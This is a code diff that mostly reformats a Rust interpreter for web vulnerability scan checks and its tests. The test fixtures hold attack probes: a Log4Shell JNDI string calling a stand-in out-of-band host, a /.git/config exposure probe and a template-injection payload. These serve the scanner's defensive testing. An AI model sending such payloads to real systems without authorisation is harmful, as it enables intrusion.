@@ -9,9 +9,7 @@ use base64::Engine;
 use rand::Rng;
 use sha2::Digest;
 
-use super::{
-    Condition, Expr, InteractionKind, Interpol, ModMode, Part, RequestMod, Value,
-};
+use super::{Condition, Expr, InteractionKind, Interpol, ModMode, Part, RequestMod, Value};
 
 #[derive(Debug, Clone, PartialEq)]
 pub struct RequestData {
@@ -112,13 +110,28 @@ impl ResponseData {
     /// this, or no two responses ever compare equal.
     pub fn comparable(&self) -> String {
         const VOLATILE: &[&str] = &[
-            "date", "set-cookie", "expires", "last-modified", "etag", "age",
-            "cf-ray", "x-request-id", "x-amzn-trace-id", "x-amz-cf-id",
-            "x-amz-cf-pop", "server-timing", "report-to", "nel",
+            "date",
+            "set-cookie",
+            "expires",
+            "last-modified",
+            "etag",
+            "age",
+            "cf-ray",
+            "x-request-id",
+            "x-amzn-trace-id",
+            "x-amz-cf-id",
+            "x-amz-cf-pop",
+            "server-timing",
+            "report-to",
+            "nel",
         ];
         let mut out = format!(
             "{} {}\r\n",
-            if self.http_version.is_empty() { "HTTP/1.1" } else { &self.http_version },
+            if self.http_version.is_empty() {
+                "HTTP/1.1"
+            } else {
+                &self.http_version
+            },
             self.status_code
         );
         for (k, v) in &self.headers {
@@ -158,7 +171,9 @@ fn url_path_query(url: &str) -> (String, String) {
 }
 
 fn url_protocol(url: &str) -> String {
-    url.split_once("://").map(|(p, _)| p.to_string()).unwrap_or_default()
+    url.split_once("://")
+        .map(|(p, _)| p.to_string())
+        .unwrap_or_default()
 }
 
 fn url_host_port(url: &str) -> (String, String) {
@@ -282,10 +297,11 @@ pub fn eval_expr(cx: &mut Context, e: &Expr) -> Result<String, ExecError> {
         Expr::Str(s) => resolve_interpol(cx, s),
         Expr::Var(name) => match name.as_str() {
             "user_agent" => Ok(cx.user_agent.clone()),
-            "insertion_point_base_value" => cx
-                .insertion_point_base_value
-                .clone()
-                .ok_or_else(|| ExecError("insertion_point_base_value outside an insertion-point check".into())),
+            "insertion_point_base_value" => {
+                cx.insertion_point_base_value.clone().ok_or_else(|| {
+                    ExecError("insertion_point_base_value outside an insertion-point check".into())
+                })
+            }
             other => {
                 if let Some(v) = cx.vars.get(other) {
                     Ok(v.clone())
@@ -310,10 +326,11 @@ fn eval_path(cx: &mut Context, segs: &[String]) -> Result<String, ExecError> {
     if segs.len() == 1 {
         return match segs[0].as_str() {
             "user_agent" => Ok(cx.user_agent.clone()),
-            "insertion_point_base_value" => cx
-                .insertion_point_base_value
-                .clone()
-                .ok_or_else(|| ExecError("insertion_point_base_value outside an insertion-point check".into())),
+            "insertion_point_base_value" => {
+                cx.insertion_point_base_value.clone().ok_or_else(|| {
+                    ExecError("insertion_point_base_value outside an insertion-point check".into())
+                })
+            }
             name => {
                 // a named exchange stringifies to its raw response
                 if let Some(ex) = cx.exchanges.get(name) {
@@ -334,7 +351,9 @@ fn eval_path(cx: &mut Context, segs: &[String]) -> Result<String, ExecError> {
     match segs[1].as_str() {
         "response" => response_property(ex, &segs[2..]),
         "request" => request_property(ex, &segs[2..]),
-        other => err(format!("expected `request` or `response` after `{name}`, got `{other}`")),
+        other => err(format!(
+            "expected `request` or `response` after `{name}`, got `{other}`"
+        )),
     }
 }
 
@@ -420,7 +439,10 @@ fn eval_call(cx: &mut Context, name: &str, args: &[Expr]) -> Result<String, Exec
         if args.len() == want {
             Ok(())
         } else {
-            err(format!("{name} takes {want} argument(s), got {}", args.len()))
+            err(format!(
+                "{name} takes {want} argument(s), got {}",
+                args.len()
+            ))
         }
     };
     match name {
@@ -432,7 +454,9 @@ fn eval_call(cx: &mut Context, name: &str, args: &[Expr]) -> Result<String, Exec
             };
             const CHARS: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
             let mut rng = rand::thread_rng();
-            Ok((0..n).map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char).collect())
+            Ok((0..n)
+                .map(|_| CHARS[rng.gen_range(0..CHARS.len())] as char)
+                .collect())
         }
         "regex_replace" => {
             argc(3)?;
@@ -471,7 +495,8 @@ fn eval_call(cx: &mut Context, name: &str, args: &[Expr]) -> Result<String, Exec
         }
         "sha1" => {
             argc(1)?;
-            Ok(crate::decoder_ops::sha1_hex(&eval_expr(cx, &args[0])?))
+            crate::decoder_ops::apply(crate::decoder_ops::Op::Sha1, &eval_expr(cx, &args[0])?)
+                .map_err(ExecError)
         }
         "sha256" => {
             argc(1)?;
@@ -481,18 +506,15 @@ fn eval_call(cx: &mut Context, name: &str, args: &[Expr]) -> Result<String, Exec
         }
         "md5" => {
             argc(1)?;
-            Ok(crate::decoder_ops::md5_hex(&eval_expr(cx, &args[0])?))
+            crate::decoder_ops::apply(crate::decoder_ops::Op::Md5, &eval_expr(cx, &args[0])?)
+                .map_err(ExecError)
         }
         other => err(format!("unknown function `{other}`")),
     }
 }
 
 /// Apply one request modification to an in-progress request.
-pub fn apply_mod(
-    cx: &mut Context,
-    req: &mut RequestData,
-    m: &RequestMod,
-) -> Result<(), ExecError> {
+pub fn apply_mod(cx: &mut Context, req: &mut RequestData, m: &RequestMod) -> Result<(), ExecError> {
     match m {
         RequestMod::Headers { mode, pairs } => {
             for (k, v) in pairs {
@@ -723,8 +745,25 @@ mod tests {
 
     #[test]
     fn differs_ignores_volatile_headers() {
-        let mut a = super::ResponseData { status_code: 200, http_version: "HTTP/1.1".into(), headers: vec![("Date".into(), "Tue".into()), ("Content-Type".into(), "text/plain".into())], body: "same".into() };
-        let mut b = super::ResponseData { status_code: 200, http_version: "HTTP/1.1".into(), headers: vec![("Date".into(), "Wed".into()), ("Set-Cookie".into(), "s=1".into()), ("Content-Type".into(), "text/plain".into())], body: "same".into() };
+        let mut a = super::ResponseData {
+            status_code: 200,
+            http_version: "HTTP/1.1".into(),
+            headers: vec![
+                ("Date".into(), "Tue".into()),
+                ("Content-Type".into(), "text/plain".into()),
+            ],
+            body: "same".into(),
+        };
+        let mut b = super::ResponseData {
+            status_code: 200,
+            http_version: "HTTP/1.1".into(),
+            headers: vec![
+                ("Date".into(), "Wed".into()),
+                ("Set-Cookie".into(), "s=1".into()),
+                ("Content-Type".into(), "text/plain".into()),
+            ],
+            body: "same".into(),
+        };
         assert_eq!(a.comparable(), b.comparable());
         b.body = "different".into();
         assert_ne!(a.comparable(), b.comparable());
@@ -733,9 +772,28 @@ mod tests {
         // ...and through the condition itself
         let mut cx = cx();
         let base_req = cx.exchanges["base"].request.clone();
-        let ex = |r: super::ResponseData| super::Exchange { request: base_req.clone(), response: r };
-        cx.exchanges.insert("a".into(), ex(super::ResponseData { status_code: 200, http_version: "HTTP/1.1".into(), headers: vec![("Date".into(), "Tue".into())], body: "same".into() }));
-        cx.exchanges.insert("b".into(), ex(super::ResponseData { status_code: 200, http_version: "HTTP/1.1".into(), headers: vec![("Date".into(), "Wed".into())], body: "same".into() }));
+        let ex = |r: super::ResponseData| super::Exchange {
+            request: base_req.clone(),
+            response: r,
+        };
+        cx.exchanges.insert(
+            "a".into(),
+            ex(super::ResponseData {
+                status_code: 200,
+                http_version: "HTTP/1.1".into(),
+                headers: vec![("Date".into(), "Tue".into())],
+                body: "same".into(),
+            }),
+        );
+        cx.exchanges.insert(
+            "b".into(),
+            ex(super::ResponseData {
+                status_code: 200,
+                http_version: "HTTP/1.1".into(),
+                headers: vec![("Date".into(), "Wed".into())],
+                body: "same".into(),
+            }),
+        );
         let path = |n: &str| Expr::Path(vec![n.to_string(), "response".to_string()]);
         assert!(!eval_condition(&mut cx, &Condition::Differs(path("a"), path("b"))).unwrap());
         cx.exchanges.get_mut("b").unwrap().response.body = "changed".into();
@@ -744,9 +802,21 @@ mod tests {
 
     #[test]
     fn raw_request_recomputes_content_length() {
-        let r = super::RequestData { method: "POST".into(), url: "http://h/x".into(), http_version: "HTTP/1.1".into(), headers: vec![("Content-Length".into(), "3".into())], body: "longer-body".into() };
+        let r = super::RequestData {
+            method: "POST".into(),
+            url: "http://h/x".into(),
+            http_version: "HTTP/1.1".into(),
+            headers: vec![("Content-Length".into(), "3".into())],
+            body: "longer-body".into(),
+        };
         assert!(r.raw().contains("Content-Length: 11"), "{}", r.raw());
-        let r = super::RequestData { method: "POST".into(), url: "http://h/x".into(), http_version: "HTTP/1.1".into(), headers: vec![], body: "abc".into() };
+        let r = super::RequestData {
+            method: "POST".into(),
+            url: "http://h/x".into(),
+            http_version: "HTTP/1.1".into(),
+            headers: vec![],
+            body: "abc".into(),
+        };
         assert!(r.raw().contains("Content-Length: 3"), "{}", r.raw());
     }
 
@@ -766,68 +836,171 @@ mod tests {
     fn reserved_paths_resolve() {
         let mut cx = cx();
         let path = |s: &str| Expr::Path(s.split('.').map(|x| x.to_string()).collect());
-        assert_eq!(eval_expr(&mut cx, &path("base.response.status_code")).unwrap(), "200");
-        assert_eq!(eval_expr(&mut cx, &path("base.response.body")).unwrap(), "<html>hello</html>");
-        assert_eq!(eval_expr(&mut cx, &path("base.request.method")).unwrap(), "GET");
-        assert_eq!(eval_expr(&mut cx, &path("base.request.url.protocol")).unwrap(), "https");
-        assert_eq!(eval_expr(&mut cx, &path("base.request.url.host")).unwrap(), "example.com");
-        assert_eq!(eval_expr(&mut cx, &path("base.request.url.port")).unwrap(), "8443");
-        assert_eq!(eval_expr(&mut cx, &path("base.request.url.path")).unwrap(), "/catalog/product");
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.response.status_code")).unwrap(),
+            "200"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.response.body")).unwrap(),
+            "<html>hello</html>"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.method")).unwrap(),
+            "GET"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.url.protocol")).unwrap(),
+            "https"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.url.host")).unwrap(),
+            "example.com"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.url.port")).unwrap(),
+            "8443"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.url.path")).unwrap(),
+            "/catalog/product"
+        );
         assert_eq!(
             eval_expr(&mut cx, &path("base.request.url.file")).unwrap(),
             "/catalog/product?productId=1"
         );
-        assert_eq!(eval_expr(&mut cx, &path("base.request.url.query")).unwrap(), "productId=1");
-        assert!(eval_expr(&mut cx, &path("base.request.url")).unwrap().starts_with("https://"));
+        assert_eq!(
+            eval_expr(&mut cx, &path("base.request.url.query")).unwrap(),
+            "productId=1"
+        );
+        assert!(eval_expr(&mut cx, &path("base.request.url"))
+            .unwrap()
+            .starts_with("https://"));
         // whole request / response serialize
-        assert!(eval_expr(&mut cx, &path("base.request")).unwrap().contains("GET /catalog/product?productId=1 HTTP/2"));
-        assert!(eval_expr(&mut cx, &path("base.response")).unwrap().contains("200"));
-        assert!(eval_expr(&mut cx, &path("latest.response.body")).unwrap().contains("hello"));
-        assert!(eval_expr(&mut cx, &Expr::Var("user_agent".into())).unwrap().contains("WebProbe"));
+        assert!(eval_expr(&mut cx, &path("base.request"))
+            .unwrap()
+            .contains("GET /catalog/product?productId=1 HTTP/2"));
+        assert!(eval_expr(&mut cx, &path("base.response"))
+            .unwrap()
+            .contains("200"));
+        assert!(eval_expr(&mut cx, &path("latest.response.body"))
+            .unwrap()
+            .contains("hello"));
+        assert!(eval_expr(&mut cx, &Expr::Var("user_agent".into()))
+            .unwrap()
+            .contains("WebProbe"));
     }
 
     #[test]
     fn functions_match_the_reference_examples() {
         let mut cx = cx();
-        let call = |name: &str, args: Vec<Expr>| Expr::Call { name: name.into(), args };
-        let s = |v: &str| Expr::Str(Interpol { parts: vec![Part::Text(v.into())], interpolatable: true });
-        assert_eq!(eval_expr(&mut cx, &call("to_lower", vec![s("Carlos MONTOYA")])).unwrap(), "carlos montoya");
-        assert_eq!(eval_expr(&mut cx, &call("to_upper", vec![s("Peter weiner")])).unwrap(), "PETER WEINER");
-        assert_eq!(eval_expr(&mut cx, &call("base64_encode", vec![s("hello world")])).unwrap(), "aGVsbG8gd29ybGQ=");
-        assert_eq!(eval_expr(&mut cx, &call("base64_decode", vec![s("aGVsbG8gd29ybGQ=")])).unwrap(), "hello world");
-        assert_eq!(eval_expr(&mut cx, &call("sha1", vec![s("Hello")])).unwrap(), "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0");
-        assert_eq!(eval_expr(&mut cx, &call("sha256", vec![s("Hello")])).unwrap(), "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969");
-        assert_eq!(eval_expr(&mut cx, &call("md5", vec![s("Hello")])).unwrap(), "8b1a9953c4611296a827abf8c47804d7");
+        let call = |name: &str, args: Vec<Expr>| Expr::Call {
+            name: name.into(),
+            args,
+        };
+        let s = |v: &str| {
+            Expr::Str(Interpol {
+                parts: vec![Part::Text(v.into())],
+                interpolatable: true,
+            })
+        };
+        assert_eq!(
+            eval_expr(&mut cx, &call("to_lower", vec![s("Carlos MONTOYA")])).unwrap(),
+            "carlos montoya"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("to_upper", vec![s("Peter weiner")])).unwrap(),
+            "PETER WEINER"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("base64_encode", vec![s("hello world")])).unwrap(),
+            "aGVsbG8gd29ybGQ="
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("base64_decode", vec![s("aGVsbG8gd29ybGQ=")])).unwrap(),
+            "hello world"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("sha1", vec![s("Hello")])).unwrap(),
+            "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("sha256", vec![s("Hello")])).unwrap(),
+            "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969"
+        );
+        assert_eq!(
+            eval_expr(&mut cx, &call("md5", vec![s("Hello")])).unwrap(),
+            "8b1a9953c4611296a827abf8c47804d7"
+        );
         // regex_replace from the reference: xyz@portswigger.net -> abc@portswigger.net
         assert_eq!(
-            eval_expr(&mut cx, &call("regex_replace", vec![s("xyz@portswigger.net"), s("[a-z]*@"), s("abc@")])).unwrap(),
+            eval_expr(
+                &mut cx,
+                &call(
+                    "regex_replace",
+                    vec![s("xyz@portswigger.net"), s("[a-z]*@"), s("abc@")]
+                )
+            )
+            .unwrap(),
             "abc@portswigger.net"
         );
         // $1 backreference, from the path-check example
         assert_eq!(
-            eval_expr(&mut cx, &call("regex_replace", vec![s("/catalog/product"), s("(.)/?$"), s("$1.bak")])).unwrap(),
+            eval_expr(
+                &mut cx,
+                &call(
+                    "regex_replace",
+                    vec![s("/catalog/product"), s("(.)/?$"), s("$1.bak")]
+                )
+            )
+            .unwrap(),
             "/catalog/product.bak"
         );
         // random_str length and charset
         let r = eval_expr(&mut cx, &call("random_str", vec![Expr::Int(13)])).unwrap();
         assert_eq!(r.len(), 13);
-        assert!(r.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()));
-        assert_eq!(eval_expr(&mut cx, &call("random_str", vec![Expr::Int(0)])).unwrap(), "");
+        assert!(r
+            .chars()
+            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()));
+        assert_eq!(
+            eval_expr(&mut cx, &call("random_str", vec![Expr::Int(0)])).unwrap(),
+            ""
+        );
         // nesting: base64_encode(to_lower("ABC"))
         assert_eq!(
-            eval_expr(&mut cx, &call("base64_encode", vec![call("to_lower", vec![s("ABC")])])).unwrap(),
+            eval_expr(
+                &mut cx,
+                &call("base64_encode", vec![call("to_lower", vec![s("ABC")])])
+            )
+            .unwrap(),
             "YWJj"
         );
     }
 
     #[test]
     fn collaborator_function_uses_the_context() {
-        let collab = FakeCollaborator { next: 0, kinds: std::collections::HashSet::new() };
+        let collab = FakeCollaborator {
+            next: 0,
+            kinds: std::collections::HashSet::new(),
+        };
         let mut cx = cx();
         cx.collaborator = Some(Box::new(collab));
-        let addr = eval_expr(&mut cx, &Expr::Call { name: "generate_collaborator_address".into(), args: vec![] }).unwrap();
+        let addr = eval_expr(
+            &mut cx,
+            &Expr::Call {
+                name: "generate_collaborator_address".into(),
+                args: vec![],
+            },
+        )
+        .unwrap();
         assert_eq!(addr, "1.oast.test");
-        let addr2 = eval_expr(&mut cx, &Expr::Call { name: "generate_collaborator_address".into(), args: vec![] }).unwrap();
+        let addr2 = eval_expr(
+            &mut cx,
+            &Expr::Call {
+                name: "generate_collaborator_address".into(),
+                args: vec![],
+            },
+        )
+        .unwrap();
         assert_eq!(addr2, "2.oast.test");
     }
 
@@ -836,24 +1009,36 @@ mod tests {
         let mut cx = cx();
         cx.vars.insert("extension".into(), ".bak".into());
         cx.vars.insert("answer".into(), "1787569".into());
-        assert_eq!(eval_expr(&mut cx, &Expr::Var("extension".into())).unwrap(), ".bak");
+        assert_eq!(
+            eval_expr(&mut cx, &Expr::Var("extension".into())).unwrap(),
+            ".bak"
+        );
         // interpolated backtick string `$1{extension}`
         let s = Interpol {
-            parts: vec![Part::Text("$1".into()), Part::Hole(Expr::Var("extension".into()))],
+            parts: vec![
+                Part::Text("$1".into()),
+                Part::Hole(Expr::Var("extension".into())),
+            ],
             interpolatable: true,
         };
         assert_eq!(resolve_interpol(&mut cx, &s).unwrap(), "$1.bak");
-        assert!(matches!(eval_expr(&mut cx, &Expr::Var("missing".into())), Err(_)));
+        assert!(eval_expr(&mut cx, &Expr::Var("missing".into())).is_err());
     }
 
     #[test]
     fn host_example_mods_build_the_git_probe_request() {
         let src = include_str!("../../tests/fixtures/bchecks/host.bcheck");
-        let d = match parse(src) { Ok(d) => d, Err(e) => panic!("{e:?}") };
+        let d = match parse(src) {
+            Ok(d) => d,
+            Err(e) => panic!("{e:?}"),
+        };
         let mut cx = cx();
         // run-for-each value in scope
-        cx.vars.insert("potential_path".into(), "/.git/config".into());
-        let Stmt::SendRequest { mods, .. } = &d.body[0] else { panic!() };
+        cx.vars
+            .insert("potential_path".into(), "/.git/config".into());
+        let Stmt::SendRequest { mods, .. } = &d.body[0] else {
+            panic!()
+        };
         let mut req = base_exchange().request;
         for m in mods {
             apply_mod(&mut cx, &mut req, m).unwrap();
@@ -868,23 +1053,40 @@ mod tests {
     #[test]
     fn collaborator_example_adds_the_referer_header() {
         let src = include_str!("../../tests/fixtures/bchecks/collaborator.bcheck");
-        let d = match parse(src) { Ok(d) => d, Err(e) => panic!("{e:?}") };
-        let collab = FakeCollaborator { next: 0, kinds: std::collections::HashSet::new() };
+        let d = match parse(src) {
+            Ok(d) => d,
+            Err(e) => panic!("{e:?}"),
+        };
+        let collab = FakeCollaborator {
+            next: 0,
+            kinds: std::collections::HashSet::new(),
+        };
         let mut cx = cx();
         cx.collaborator = Some(Box::new(collab));
-        let Stmt::SendRequest { mods, .. } = &d.body[0] else { panic!() };
+        let Stmt::SendRequest { mods, .. } = &d.body[0] else {
+            panic!()
+        };
         let mut req = base_exchange().request;
         for m in mods {
             apply_mod(&mut cx, &mut req, m).unwrap();
         }
-        assert!(req.headers.iter().any(|(k, v)| k == "Referer" && v == "1.oast.test"));
+        assert!(req
+            .headers
+            .iter()
+            .any(|(k, v)| k == "Referer" && v == "1.oast.test"));
     }
 
     #[test]
     fn log4shell_example_mods_apply() {
         let src = include_str!("../../tests/fixtures/bchecks/log4shell.bcheck");
-        let d = match parse(src) { Ok(d) => d, Err(e) => panic!("{e:?}") };
-        let collab = FakeCollaborator { next: 0, kinds: std::collections::HashSet::new() };
+        let d = match parse(src) {
+            Ok(d) => d,
+            Err(e) => panic!("{e:?}"),
+        };
+        let collab = FakeCollaborator {
+            next: 0,
+            kinds: std::collections::HashSet::new(),
+        };
         let mut cx = cx();
         cx.collaborator = Some(Box::new(collab));
         // define block values resolve first
@@ -893,7 +1095,9 @@ mod tests {
             cx.vars.insert(decl.name.clone(), v);
         }
         assert!(cx.vars["log4shell"].contains("${jndi:ldap://1.oast.test/a}"));
-        let Stmt::SendRequest { mods, .. } = &d.body[0] else { panic!() };
+        let Stmt::SendRequest { mods, .. } = &d.body[0] else {
+            panic!()
+        };
         let mut req = base_exchange().request;
         for m in mods {
             apply_mod(&mut cx, &mut req, m).unwrap();
@@ -910,15 +1114,29 @@ mod tests {
     #[test]
     fn conditions_evaluate() {
         let mut cx = cx();
-        let interp = |s: &str| Interpol { parts: vec![Part::Text(s.into())], interpolatable: false };
+        let interp = |s: &str| Interpol {
+            parts: vec![Part::Text(s.into())],
+            interpolatable: false,
+        };
         let path = |s: &str| Expr::Path(s.split('.').map(|x| x.to_string()).collect());
         // matches
-        assert!(eval_condition(&mut cx, &Condition::Matches(path("base.response.body"), interp("h.llo"))).unwrap());
-        assert!(!eval_condition(&mut cx, &Condition::Matches(path("base.response.body"), interp("^h.llo$"))).unwrap());
+        assert!(eval_condition(
+            &mut cx,
+            &Condition::Matches(path("base.response.body"), interp("h.llo"))
+        )
+        .unwrap());
+        assert!(!eval_condition(
+            &mut cx,
+            &Condition::Matches(path("base.response.body"), interp("^h.llo$"))
+        )
+        .unwrap());
         // in
         assert!(eval_condition(
             &mut cx,
-            &Condition::In(Expr::Str(interp("[core]")), Expr::Str(interp("a [core] section")))
+            &Condition::In(
+                Expr::Str(interp("[core]")),
+                Expr::Str(interp("a [core] section"))
+            )
         )
         .unwrap());
         // is
@@ -935,9 +1153,15 @@ mod tests {
         .unwrap());
         // combinators + not
         let c = Condition::Or(
-            Box::new(Condition::Is(Expr::Str(interp("x")), Expr::Str(interp("y")))),
+            Box::new(Condition::Is(
+                Expr::Str(interp("x")),
+                Expr::Str(interp("y")),
+            )),
             Box::new(Condition::And(
-                Box::new(Condition::Is(Expr::Str(interp("a")), Expr::Str(interp("a")))),
+                Box::new(Condition::Is(
+                    Expr::Str(interp("a")),
+                    Expr::Str(interp("a")),
+                )),
                 Box::new(Condition::Not(Box::new(Condition::Is(
                     Expr::Str(interp("b")),
                     Expr::Str(interp("c")),
@@ -963,7 +1187,10 @@ mod tests {
     #[test]
     fn any_interaction_is_not_implied_by_nothing() {
         // Any must only be true when something arrived
-        let collab = FakeCollaborator { next: 0, kinds: [InteractionKind::Dns].into_iter().collect() };
+        let collab = FakeCollaborator {
+            next: 0,
+            kinds: [InteractionKind::Dns].into_iter().collect(),
+        };
         let mut cx = cx();
         cx.collaborator = Some(Box::new(collab));
         assert!(eval_condition(&mut cx, &Condition::Interactions(InteractionKind::Any)).unwrap());
@@ -978,7 +1205,10 @@ mod tests {
         // base status 200 != 404 -> not(...) is true
         assert!(eval_condition(&mut cx, arms[0].0.as_ref().unwrap()).unwrap());
         let mut cx404 = Context::new(Exchange {
-            response: ResponseData { status_code: 404, ..base_exchange().response },
+            response: ResponseData {
+                status_code: 404,
+                ..base_exchange().response
+            },
             ..base_exchange()
         });
         assert!(!eval_condition(&mut cx404, arms[0].0.as_ref().unwrap()).unwrap());
@@ -987,8 +1217,14 @@ mod tests {
     #[test]
     fn insertion_point_example_flow() {
         let src = include_str!("../../tests/fixtures/bchecks/insertion-point.bcheck");
-        let d = match parse(src) { Ok(d) => d, Err(e) => panic!("{e:?}") };
-        assert_eq!(d.given, GivenMode::InsertionPoints(vec![super::super::InsertionPointKind::Any]));
+        let d = match parse(src) {
+            Ok(d) => d,
+            Err(e) => panic!("{e:?}"),
+        };
+        assert_eq!(
+            d.given,
+            GivenMode::InsertionPoints(vec![super::super::InsertionPointKind::Any])
+        );
         let mut cx = cx();
         for decl in &d.define {
             let v = resolve_value(&mut cx, &decl.values[0]).unwrap();
@@ -997,10 +1233,14 @@ mod tests {
         assert_eq!(cx.vars["calculation"], "{{1337*1337}}");
         assert_eq!(cx.vars["answer"], "1787569");
         // first if: answer not in base response -> true here
-        let Stmt::If { arms } = &d.body[0] else { panic!() };
+        let Stmt::If { arms } = &d.body[0] else {
+            panic!()
+        };
         assert!(eval_condition(&mut cx, arms[0].0.as_ref().unwrap()).unwrap());
         // send payload appends the calculation to the base value
-        let Stmt::SendPayload { ops, .. } = &arms[0].1[0] else { panic!() };
+        let Stmt::SendPayload { ops, .. } = &arms[0].1[0] else {
+            panic!()
+        };
         cx.insertion_point_base_value = Some("1".into());
         let (mode, value) = &ops[0];
         assert_eq!(*mode, ModMode::Append);
